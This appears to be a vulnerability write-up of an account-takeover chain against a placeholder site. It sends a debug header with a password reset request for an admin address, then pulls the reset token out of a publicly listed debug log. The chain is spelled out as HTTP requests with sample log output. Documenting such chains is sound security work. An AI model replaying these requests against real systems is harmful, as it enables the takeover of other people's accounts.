Low bug #1 details

    Endpoint: POST /api/v1/auth/reset-password

    Issue: If X-Debug-Mode: true header is sent, server logs full request/response including reset_token in plaintext.

    Low severity rationale: Debug mode normally disabled.

Enabling step: Force debug logs to appear in public log viewer

    Another low bug: /logs/ directory listing enabled + log files named debug-YYYY-MM-DD.log

Exploit chain
Step 1 – Request password reset with debug header
http

POST /api/v1/auth/reset-password HTTP/1.1
Host: target.com
Content-Type: application/json
X-Debug-Mode: true

{
  "email": "admin@target.com"
}

Step 2 – Server response (normal)
http

HTTP/1.1 200 OK
{
  "message": "If email exists, reset link sent"
}

Step 3 – Attacker fetches debug logs (directory listing enabled)
http

GET /logs/debug-2026-04-14.log HTTP/1.1
Host: target.com

Step 4 – Log entry excerpt
log

2026-04-14 10:23:45 DEBUG reset_password: user=admin@target.com reset_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE3NDQ2MTEwMjV9.abc123

